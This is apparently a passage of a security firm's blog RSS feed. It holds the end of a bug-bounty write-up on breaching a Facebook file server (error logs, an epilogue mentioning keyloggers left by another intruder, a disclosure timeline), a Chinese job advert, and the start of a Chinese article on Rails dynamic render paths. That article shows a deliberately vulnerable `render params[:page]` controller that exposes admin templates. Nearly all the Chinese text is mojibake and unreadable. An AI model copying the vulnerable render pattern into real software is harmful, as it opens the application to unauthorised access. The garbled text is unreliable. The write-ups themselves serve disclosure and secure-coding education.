&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After checking the browser, the SSL certificate of files.fb.com was *.fb.com ‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h3&gt;

&lt;p&gt;After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD&lt;/p&gt;

&lt;p&gt;Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September&lt;/p&gt;

&lt;p&gt;the July one seemed to be a server ‚Äúdorking‚Äù and the September one seemed more vicious. Other than server ‚Äúdorking‚Äù keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P&lt;br /&gt;
The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Here‚Äôs the end of the story, and, generally speaking, it was a rather interesting experience xD&lt;br /&gt;
Thanks to this event, it inspired me to write some articles about penetration :P&lt;/p&gt;

&lt;p&gt;Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 Provide vulnerability details to Facebook Security Team&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 Receive automatic response&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 Receive response from Thomas that inspection is in progress&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking if there anything I should pay special attention to in blog post ?&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?&lt;/li&gt;
  &lt;li&gt;2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete?&lt;/li&gt;
  &lt;li&gt;2016/02/24 Receive response from Hai about the bounty will include in March payments cycle.&lt;/li&gt;
  &lt;li&gt;2016/04/20 Receive response from Reginaldo about the forensics investigation is done&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[Â∑≤ÁµêÊùü] DEVCORE ÂæµÊ±ÇË°åÊîøÂá∫Á¥ç‰∫∫Êâç</title>
                <description>&lt;p&gt;Ôºà2015.9.16 Â∑≤ÁµêÊùüÂæµÊâçÔºâ&lt;/p&gt;

&lt;p&gt;Êà¥Â§´ÂØáÁàæÂç≥Â∞áË¶ÅÈÇÅÂÖ•Á¨¨ÂõõÂÄãÂπ¥È†≠ÔºåÂú®ÈÅéÂéªÁöÑÊ≠≤Êúà‰∏≠ÔºåÊàëÂÄëÊé®Âª£Ë≥áÂÆâÁöÑÈáçË¶ÅÊÄß„ÄÅÂº∑Ë™øÂÆâÂÖ®ÈñãÁôº„ÄÇÊàëÂÄëÂ†ÖÊåÅÊèê‰æõÊúÄÈ´òÂìÅË≥™ÁöÑÊª≤ÈÄèÊ∏¨Ë©¶ÊúçÂãôÔºåÂçîÂä©‰ºÅÊ•≠ÊâæÂá∫Èö±ËóèÁöÑË≥áÂÆâÂ®ÅËÑÖ„ÄÇÊàëÂÄë‰πü‰∏çÊñ∑Á≤æÈÄ≤ÊäÄË°ìÔºåÊúüË®±Ëá™Â∑±ËÉΩÊàêÁÇ∫ÂÖ®Âè∞ÁÅ£Á¨¨‰∏ÄÁöÑÊª≤ÈÄèÊ∏¨Ë©¶ÂúòÈöä„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊÑüË¨ùÈÄô‰∫õÂπ¥‰æÜÊ•≠ÁïåÊúãÂèãÂ∞çÊàëÂÄëÁöÑËÇØÂÆöËàáÊîØÊåÅÔºåÊà¥Â§´ÂØáÁàæÂæó‰ª•ËåÅÂ£ØÔºåÂ¶Ç‰ªäÔºåÊàëÂÄëÈÇÑÈúÄË¶Å‰∏Ä‰ΩçË°åÊîøÂá∫Á¥ç‰∫∫ÊâçÔºåÊàëÂÄëÊ∏¥ÊúõÊÇ®ÁöÑÂä†ÂÖ•ÔºåÂÅöÁÇ∫Êà¥Â§´ÂØáÁàæÁ©©ÂÆöÁöÑÂäõÈáè„ÄÇÁõ∏ÈóúÁ¥∞ÁØÄÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÂÖßÂÆπ&quot;&gt;Â∑•‰ΩúÂÖßÂÆπ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ÂçîÂä©ËôïÁêÜÂ∫∂ÂãôÊÄßË°åÊîøÂ∑•‰ΩúÔºàÊé•ËÅΩ‰æÜÈõª„ÄÅÊî∂Áôº„ÄÅÊé•ÂæÖÔºâ&lt;/li&gt;
  &lt;li&gt;Ë≤†Ë≤¨ÂêàÁ¥ÑÁÆ°ÁêÜ„ÄÅÂá∫Áº∫ËÄÉÂã§ÁÆ°ÁêÜ„ÄÅÂ∏≥ÂãôÊòéÁ¥∞Êï¥ÁêÜ&lt;/li&gt;
  &lt;li&gt;Ë¶èÂäÉ„ÄÅÂü∑Ë°åÊé°Ë≥ºÂ∫∂Âãô&lt;/li&gt;
  &lt;li&gt;ÊáâÊî∂Êáâ‰ªòÊ¨æÈ†ÖËàáÈõ∂Áî®ÈáëÁÆ°ÁêÜ&lt;/li&gt;
  &lt;li&gt;ÈäÄË°åÂæÄ‰æÜËàá‰∏ÄËà¨Ê¨æÈ†ÖÊî∂‰ªò‰ΩúÊ•≠&lt;/li&gt;
  &lt;li&gt;ÂçîÂä©‰∏ªÁÆ°Âü∑Ë°åÁõ∏ÈóúÊ•≠Âãô&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÊôÇÈñì&quot;&gt;Â∑•‰ΩúÊôÇÈñì&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÂú∞Èªû&quot;&gt;Â∑•‰ΩúÂú∞Èªû&lt;/h3&gt;
&lt;p&gt;Âè∞ÂåóÂ∏Ç‰∏≠Â±±ÂçÄÂæ©ËààÂåóË∑Ø 168 Ëôü 10 Ê®ì&lt;br /&gt;
ÔºàÊç∑ÈÅãÂçó‰∫¨Âæ©ËààÁ´ôÔºåËµ∞Ë∑ØÁ¥Ñ‰∏âÂàÜÈêòÔºâ&lt;/p&gt;

&lt;h3 id=&quot;Ê¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;Ê¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÈúÄÊúâÂÖ©Âπ¥‰ª•‰∏äÁõ∏ÈóúÂ∑•‰ΩúÁ∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâË©¶ÁÆóË°®ÔºåÂÖ∑Áç®Á´ãÊí∞ÂØ´Ë©¶ÁÆóË°®ÂÖ¨ÂºèËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÁøíÊÖ£‰ΩøÁî®Èõ≤Á´ØÊúçÂãôÔºåÂ¶ÇÔºöGoogle Drive, Dropbox ÊàñÂÖ∂‰ªñ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Âä†ÂàÜÊ¢ù‰ª∂&quot;&gt;Âä†ÂàÜÊ¢ù‰ª∂&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÊÇ®‰ΩøÁî®ÈÅéÂ∞àÊ°àÁÆ°ÁêÜÁ≥ªÁµ±ÔºåÂ¶ÇÔºöTrello, Basecamp, Redmine ÊàñÂÖ∂‰ªñ&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;ÊÇ®Â∞áÊúÉ‰ΩøÁî®Â∞àÊ°àÁÆ°ÁêÜÁ≥ªÁµ±ÁÆ°ÁêÜÂπ≥Êó•‰ªªÂãô&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;ÊÇ®ÊòØ MAC ‰ΩøÁî®ËÄÖ&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;ÊÇ®Êú™‰æÜÁöÑÈõªËÖ¶ÊúÉÊòØ MACÔºåÊàëÂÄëÂ∏åÊúõÊÇ®Ë∂äÂø´È†ÜÊö¢‰ΩøÁî®ÈõªËÖ¶Ë∂äÂ•Ω&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;ÊÇ®ÊõæÁ∂ìÂÅöÈÅéË°åÊîøÁõ∏ÈóúËÅ∑ÂãôÔºå‰ΩÜÂ∞çË°åÊîø‰∏ÄËÅ∑Êúâ‰∏ÄÂ•óËá™Â∑±ÁöÑÊÉ≥Ê≥ï&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;ÊàëÂÄëÊòØÊñ∞ÂâµÂÖ¨Âè∏ÔºåÊàëÂÄëÊ≠°ËøéÊÇ®ÊåëÊà∞Êó¢ÂÆöÁöÑË°åÊîøÂàªÁâàÂç∞Ë±°&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;ÊÇ®ÊòØÁîüÊ¥ªÈß≠ÂÆ¢&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;ÊÇ®‰∏çÈúÄË¶ÅÊúÉÂØ´Á®ãÂºèÔºå‰ΩÜÊÇ®ÁøíÊÖ£ËßÄÂØüÁîüÊ¥ª‰∏≠ÁöÑË¶èÂæãÔºå‰∏¶ÊÉ≥Ëæ¶Ê≥ïÂà©Áî®ÈÄô‰∫õË¶èÂæãÊúâÊïàÁéáÁöÑËß£Ê±∫ÂïèÈ°å&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÁí∞Â¢É&quot;&gt;Â∑•‰ΩúÁí∞Â¢É&lt;/h3&gt;
&lt;p&gt;ÊàëÂÄëÊ≥®ÈáçÂÖ¨Âè∏ÊØèÂÄã‰∫∫ÁöÑË∫´ÂøÉÂÅ•Â∫∑ÔºåÊâÄ‰ª•Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÊÇ®ÊúÉÂú®‰∏ÄÂÄãÈñãÈóäÁöÑËæ¶ÂÖ¨Áí∞Â¢ÉÂ∑•‰Ωú
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;ÊÇ®ÊúÉÊìÅÊúâ‰∏ÄÂºµ Aeron ‰∫∫È´îÂ∑•Â≠∏Ê§Ö
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Ë£úÊªøÈ£≤ÊñôÔºàÂè¶ÊúâÂíñÂï°Ê©üÔºâ„ÄÅÈõ∂È£üÔºåËÆìÊÇ®‰øùÊåÅÂøÉÊÉÖÊÑâÂø´
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;ÂÖ¨Âè∏Êèê‰æõÈ£õÈè¢Ê©üËÆìÊÇ®ÁôºÊ¥©Â∞ç‰∏ªÁÆ°ÁöÑÊÄ®Ê∞£
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Âì°Â∑•Á¶èÂà©&quot;&gt;Âì°Â∑•Á¶èÂà©&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Á¨¨‰∏ÄÂπ¥Âç≥ÊúâÁâπ‰ºëÔºàÁÖßÊØî‰æãÔºâÔºåÊØèÂπ¥Â∫¶‰∫îÂ§©ÂÖ®Ëñ™ÁóÖÂÅá&lt;/li&gt;
  &lt;li&gt;‰∏âÁØÄ„ÄÅÁîüÊó•Á¶ÆÈáë&lt;/li&gt;
  &lt;li&gt;ÊØèÂ≠£Âì°Â∑•ËÅöÈ§ê&lt;/li&gt;
  &lt;li&gt;ÊØèÂπ¥Âì°Â∑•ÊóÖÈÅä&lt;/li&gt;
  &lt;li&gt;ÊØèÂπ¥Âì°Â∑•ÂÅ•Ê™¢&lt;/li&gt;
  &lt;li&gt;Âãû‰øù„ÄÅÂÅ•‰øù„ÄÅÂãûÈÄÄ&lt;/li&gt;
  &lt;li&gt;ÂÆöÊúüÂ∞à‰∫∫ÊåâÊë©ÊúçÂãô&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;
&lt;p&gt;Êñ∞Âè∞Âπ£ 32,000 - 40,000 Ôºà‰øùË≠â 14 ÂÄãÊúàÔºâ&lt;/p&gt;

&lt;h3 id=&quot;ÊáâÂæµÊñπÂºè&quot;&gt;ÊáâÂæµÊñπÂºè&lt;/h3&gt;
&lt;p&gt;Ë´ã‰æÜ‰ø°Â∞áÊÇ®ÁöÑÂ±•Ê≠∑‰ª• PDF Ê†ºÂºèÂØÑÂà∞ recruiting@devco.reÔºåÊ®ôÈ°åÊ†ºÂºèÂ¶Ç‰∏ãÔºö&lt;br /&gt;&lt;strong&gt;[ÊáâÂæµ] Ë°åÊîøÂá∫Á¥çÂ∞àÂì° (ÊÇ®ÁöÑÂßìÂêç)&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;ÊàëÂÄëÊúÉÂú®ÂÖ©ÈÄ±ÂÖß‰∏ªÂãïËàáÊÇ®ËÅØÁπ´„ÄÇÂØ©Êü•ÊñπÂºèÊúÉÊúâÊõ∏ÂØ©„ÄÅÁ∑ö‰∏äÊ∏¨È©ó‰ª•ÂèäÈù¢Ë©¶‰∏âÂÄãÈöéÊÆµ„ÄÇÊúÄÂø´Â∞áÊñº‰πùÊúàÂàùÈñãÂßãÈÄ≤Ë°åÁ¨¨‰∫åÈöéÊÆµÊ∏¨Ë©¶ÔºåÁÖ©Ë´ãËÄêÂøÉÁ≠âÂÄô„ÄÇ&lt;br /&gt;Â±•Ê≠∑Ë´ãÊéßÂà∂Âú®ÂÖ©È†Å‰ª•ÂÖßÔºåÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
  &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
  &lt;li&gt;Â∑•‰ΩúÁ∂ìÊ≠∑&lt;/li&gt;
  &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
  &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºàË´ãËá™Ë°åÂ∞ãÊâæÁ∑ö‰∏äÊ∏¨È©óÊ∏¨Ë©¶Ôºâ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ë´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.doc&quot;&gt;DOC&lt;/a&gt;„ÄÅ&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇ&lt;br /&gt;
Ëã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÈôÑË®ª&quot;&gt;ÈôÑË®ª&lt;/h3&gt;
&lt;p&gt;Áî±ÊñºÊúÄËøëÊ•≠ÂãôËºÉÁÇ∫ÂøôÁ¢åÔºåËã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´í„ÄÇ&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;ÊàëÂÄëÈÅ∏ÊìáÂÑ™ÂÖàÂú®ÈÉ®ËêΩÊ†ºÂÖ¨Â∏ÉÂæµÊâçË≥áË®äÔºåÊòØÂ∏åÊúõÊÇ®‰πüÂ∞çÂÆâÂÖ®Ë≠∞È°åÊÑüËààË∂£ÔºåÂç≥‰Ωø‰∏çÊáÇÊäÄË°ì‰πüÊÉ≥ÁÇ∫Âè∞ÁÅ£Ë≥áÂÆâÁõ°‰∏ÄÈªûÂäõ„ÄÇÂ¶ÇÊûúÊÇ®Èô§‰∫ÜËôïÁêÜÂü∫Êú¨‰∫ãÂãôÂ§ñÈÇÑÊúâÊõ¥Â§öÊÉ≥Ê≥ïÔºå‰πüÊ≠°ËøéËàáÊàëÂÄëËÅØÁπ´ÔºåÊàëÂÄëÊúÉ‰øùÁïôÁµ¶ÊÇ®ÁôºÊèÆÁöÑÁ©∫ÈñìËàáË™øÂçáËñ™Ê∞¥„ÄÇ&lt;br /&gt;&lt;br /&gt;
ÁÑ°Ë´ñÂ¶Ç‰ΩïÔºåÊàëÂÄëÈÉΩÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°ÔºåÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2015/08/19/devcore-2015-recruit/</link>
                <guid>https://devco.re/blog/2015/08/19/devcore-2015-recruit</guid>
                <pubDate>Wed, 19 Aug 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Rails ÂãïÊÖãÊ®£ÊùøË∑ØÂæëÁöÑÈ¢®Èö™</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

&lt;p&gt;ÂæûÂÆâÂÖ®ÈñãÁôºÁöÑËßíÂ∫¶‰æÜÁúãÔºåRuby on Rails ÊòØ‰∏ÄÂ•óÂæàÂèãÂñÑÁöÑÊ°ÜÊû∂„ÄÇÂÆÉÂæûÊ°ÜÊû∂Â±§ÈÅøÂÖç‰∫ÜÂæàÂ§öÈÅéÂéªÁ∂≤Á´ôÂ∏∏Âá∫ÁèæÁöÑÂÆâÂÖ®ÂïèÈ°åÔºå‰æãÂ¶Ç‰ΩøÁî® ORM ÈÅøÂÖçÂ§ßÈÉ®ÂàÜÁöÑ SQL injection ÂïèÈ°å„ÄÅÊúâÂÖßÂª∫ÁöÑ authenticity_token ËÆìÈñãÁôºËÄÖ‰∏çÂøÖÁâπÂà•ÁÖ©ÊÉ± CSRF„ÄÅÂæûÊ©üÂà∂Èù¢Ë¶èÂÆöÈñãÁôºËÄÖ‰ΩøÁî® Strong Parameter ÈÅøÂÖç Mass Assignment„ÄÅÈ†êË®≠ËΩâÂåñÂç±Èö™Â≠óÂÖÉÈÅøÂÖç XSS Á≠â‚Ä¶„ÄÇ&lt;/p&gt;

&lt;p&gt;Â∞±ÊàëÂÄëÈÅéÂéª&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/a&gt;ÁöÑÁ∂ìÈ©ó‰æÜË™™ÔºåRails Á∂≤Á´ôÈõñÁÑ∂ÈÇÑÊòØËÉΩÊâæÂà∞ÂïèÈ°åÔºå‰ΩÜÁõ∏Â∞çÂïèÈ°åËºÉÂ∞ëÔºåËÄå‰∏îÂæàÂ∞ëÂñÆÁ¥îÂõ†ÁÇ∫ Rails ÂØ´Ê≥ïÂïèÈ°åÊãøÂà∞Á≥ªÁµ±Êìç‰ΩúÊ¨ä„ÄÇËÄå‰ªäÂ§©Ë¶ÅÂàÜ‰∫´ÁöÑÔºåÊòØÂú®‰∏ÄÊ¨°Êª≤ÈÄèÊ∏¨Ë©¶‰∏≠ÊØîËºÉÁâπÂà•ÁöÑ‰æãÂ≠êÔºåÂõ†ÁÇ∫ÈñãÁôºËÄÖ‰ΩøÁî®‰∫ÜÂãïÊÖãÊ®£ÊùøË∑ØÂæë(Dynamic Render Paths)ÁöÑÂØ´Ê≥ï&lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;ÔºåÊúÄÂæåÈÄ†Êàê‰∫ÜÂö¥ÈáçÁöÑÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ÂãïÊÖãÊ®£ÊùøË∑ØÂæëÔºåOWASP ÁöÑ&lt;a href=&quot;https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths&quot;&gt;‰ªãÁ¥π&lt;/a&gt;ÊòØÈÄôÊ®£ÁöÑÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In Rails, controller actions and views can dynamically determine which view or partial to render by calling the ‚Äúrender‚Äù method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.&lt;br /&gt;&lt;br /&gt;
Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;OWASP ÊòØË™™ÔºåÂ¶ÇÊûú‰Ω†ÁöÑÊ®£ÊùøË∑ØÂæëÊòØÂãïÊÖãÁî¢ÁîüÁöÑÔºåËÄå‰∏î‰ΩøÁî®ËÄÖÂèØ‰ª•ÊéßÂà∂ÈÇ£ÂÄãÊ®£ÊùøË∑ØÂæëÔºåÈÇ£È∫º‰ΩøÁî®ËÄÖÂ∞±ÂèØ‰ª•ËÆÄÂèñÂà∞‰ªªÊÑèÊ®£ÊùøÔºåÂåÖÂê´ÁÆ°ÁêÜ‰ªãÈù¢ÁöÑÊ®£Êùø„ÄÇÈÄôÊ®£ÁöÑÊèèËø∞ÊÑüË¶∫ÈÇÑÂ•ΩÔºå‰ΩÜÂ∞±ÊàëÂÄëÁöÑÁôºÁèæÔºåÈÄôÂÖ∂ÂØ¶ÊòØÊõ¥Âö¥ÈáçÁöÑÁõ¥Êé•Â≠òÂèñÁâ©‰ª∂ÂïèÈ°å(Insecure Direct Object References)ÔºåÁîöËá≥ÊúâÊ©üÊúÉÈÄ†ÊàêÈÅ†Á´ØÂëΩ‰ª§Âü∑Ë°å(Remote Code Execution)ÔºåÊÄéÈ∫ºË™™Âë¢ÔºüÊàëÂÄëÁõ¥Êé•Áúã‰∏ãÂéª„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Âü∫Êú¨Á¥∞ÁØÄ&quot;&gt;Âü∫Êú¨Á¥∞ÁØÄ&lt;/h3&gt;

&lt;p&gt;‰∏ÄÂÄãÂãïÊÖãÊ®£ÊùøË∑ØÂæëÁöÑÂØ´Ê≥ïÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# app/controllers/welcome_controller.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WelcomeController&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ApplicationController&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;index&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ËÄå index ÁöÑÊ®£ÊùøÂÖßÂÆπÊòØÈÄôÊ®£Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/index.html.erb --&amp;gt;&lt;/span&gt;
This is INDEX page.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Âè¶Â§ñÂª∫‰∏ÄÂÄã demo Ê®£ÊùøÂÅöÁ§∫ÊÑèÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/demo.html.erb --&amp;gt;&lt;/span&gt;
This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂØ¶ÈöõÊ∏¨Ë©¶ÔºåÂ¶ÇÊûúÊàëÂÄëÈÄ£Âà∞ WelcomeController ÁöÑ index actionÔºå‰∏çÂ∏∂‰ªª‰ΩïÂèÉÊï∏ÊúÉËÆÄÂèñ index Ê®°Áâà„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_index.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÂ∏∂ÂèÉÊï∏ page=demoÔºåÊúÉËÆÄÂèñÂà∞ demo Ê®°Áâà„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_demo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•ÔºåÂ¶ÇÊûúÊàëÂÄëÁü•ÈÅìÁÆ°ÁêÜ‰ªãÈù¢ÁöÑÊ®°ÁâàË∑ØÂæëÔºåÈÄÅÂá∫Ë∑ØÂæëÂèÉÊï∏Â∞±ÂèØ‰ª•ËÆÄÂèñÂà∞ÁÆ°ÁêÜ‰ªãÈù¢„ÄÇÈÄôÂ∞±ÊòØ OWASP ÊâÄÊèèËø∞ÁöÑÈ¢®Èö™ÔºåÊîªÊìäËÄÖÂæó‰ª•ËÆÄÂèñ‰ªªÊÑèÊ®°Áâà„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_admin.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

